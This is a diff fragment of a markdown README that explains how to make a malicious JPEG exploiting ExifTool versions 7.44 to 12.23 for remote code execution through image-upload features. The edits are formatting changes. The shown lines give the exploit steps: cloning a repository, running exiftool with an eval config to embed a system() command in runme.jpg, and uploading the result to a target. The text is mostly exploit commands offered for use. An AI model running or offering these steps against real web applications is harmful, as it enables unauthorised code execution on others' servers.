@@ -27,9 +27,11 @@ If the web application has a feature of uploading image and if the application i
 The exiftool version should be between  7.44 to 12.23. </br>
 </br>
 *COMMAND (exploit)* 
-</br> Clone the repo </br>
+
 `git clone https://github.com/OneSecCyber/JPEG_RCE.git`
+</br> ''
 </br> `cd JPEG_RCE`
+</br>
 </br> `exiftool -config eval.config runme.jpg -eval='system("ls -la")'`</br>
 It will create malicious jpg file </br>
 Upload the file or run the file in you local system to see the magic.. </br>
